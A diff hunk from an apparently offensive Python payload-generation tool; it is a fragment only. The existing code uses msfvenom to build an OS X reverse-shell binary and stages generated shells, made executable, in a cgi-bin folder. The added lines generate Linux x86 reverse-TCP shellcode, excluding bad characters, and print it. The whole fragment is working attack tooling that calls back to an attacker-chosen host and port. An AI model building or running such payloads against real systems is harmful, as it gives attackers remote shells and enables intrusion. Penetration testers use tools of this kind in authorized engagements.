@@ -504,6 +504,10 @@ Facebook: https://web.facebook.com/profile.php?id=61560596232150
         os.system(
             f'msfvenom -p osx/x86/shell_reverse_tcp LHOST="{lhost}" LPORT={lport} -f macho > shell.macho'
         )
+        result = subprocess.getoutput(
+            f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f python -b '\x80\x0a\x0d'"
+        )
+        print(result)
         os.system("mv shell.* modules/cgi-bin")
         os.system("chmod +x modules/cgi-bin/*")
         print("[*] Lazy MSFVenom Reverse_shell payloads in modules/cgi-bin/ ")
